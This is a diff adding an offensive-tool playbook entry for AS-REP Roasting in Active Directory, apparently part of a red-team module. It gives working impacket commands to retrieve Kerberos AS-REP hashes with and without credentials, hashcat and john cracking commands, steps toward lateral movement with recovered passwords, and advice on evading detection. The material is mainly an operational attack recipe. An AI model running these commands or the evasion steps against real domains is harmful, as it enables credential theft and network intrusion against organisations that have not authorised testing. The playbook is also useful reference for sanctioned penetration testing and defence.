@@ -1,0 +1,44 @@
+---
+name: asreproast
+phase: ad
+mitre_ids: [T1558.004]
+opsec_level: 3
+description: Retrieve AS-REP hashes for accounts without Kerberos pre-authentication and crack offline
+module: phantom-ad
+tools: [impacket, hashcat, john]
+prerequisites: [domain_controller_ip, domain_fqdn]
+---
+# AS-REP Roasting
+
+## Technique
+Accounts with "Do not require Kerberos preauthentication" set can be targeted
+without valid credentials.  The KDC returns an AS-REP encrypted with the
+account's password hash, which can be cracked offline.
+
+## Commands
+```bash
+# Enumerate and retrieve AS-REP hashes (no credentials needed)
+impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
+
+# With valid credentials (enumerate all vulnerable accounts)
+impacket-GetNPUsers DOMAIN/user:password@DC_IP -request -format hashcat -outputfile asrep_hashes.txt
+
+# Crack with hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# Alternative: john
+john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+## Usage
+1. Obtain a list of domain usernames (from LDAP enum or OSINT).
+2. Query the DC for AS-REP responses without pre-auth.
+3. Crack hashes offline and use recovered passwords for lateral movement.
+
+## Detection Evasion
+- Requests look like normal Kerberos AS-REQ traffic.
+- Spread requests over time to avoid volume-based detection.
+- Use a targeted user list rather than spraying all accounts.
+
+## MITRE ATT&CK
+- T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
